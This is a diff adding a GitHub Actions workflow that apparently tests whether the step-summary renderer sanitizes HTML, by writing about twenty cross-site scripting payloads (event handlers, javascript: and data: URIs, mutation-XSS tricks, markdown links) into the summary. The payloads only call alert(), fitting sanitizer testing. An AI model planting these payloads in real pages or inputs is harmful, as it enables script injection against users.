@@ -1,0 +1,39 @@
+name: Step Summary XSS Test
+on: [workflow_dispatch]
+jobs:
+  xss-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: XSS payloads in step summary
+        run: |
+          cat >> $GITHUB_STEP_SUMMARY << 'PAYLOADS'
+          ## XSS Test Payloads
+
+          <img src=x onerror=alert(1)>
+          <svg onload=alert(2)>
+          <details ontoggle=alert(3) open><summary>test</summary></details>
+          <a href="javascript:alert(4)">click</a>
+          <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(5)>
+          <form><button formaction="javascript:alert(6)">test</button></form>
+          <input onfocus=alert(7) autofocus>
+          <marquee onstart=alert(8)>test</marquee>
+          <iframe src="javascript:alert(9)"></iframe>
+          <object data="javascript:alert(10)"></object>
+          <embed src="javascript:alert(11)">
+          <video><source onerror=alert(12)>
+          <body onload=alert(13)>
+          <script>alert(14)</script>
+
+          ```html
+          <img src=x onerror=alert('codeblock')>
+          ```
+
+          [link](javascript:alert(15))
+          [link2](data:text/html,<script>alert(16)</script>)
+
+          <div style="background:url('javascript:alert(17)')">test</div>
+          <div style="behavior:url('xss')">test</div>
+          <p id="x" tabindex="1" onfocus="alert(18)">test</p>
+          <math><mi xlink:href="javascript:alert(19)">test</mi></math>
+          PAYLOADS
+          echo "Payloads written to step summary"
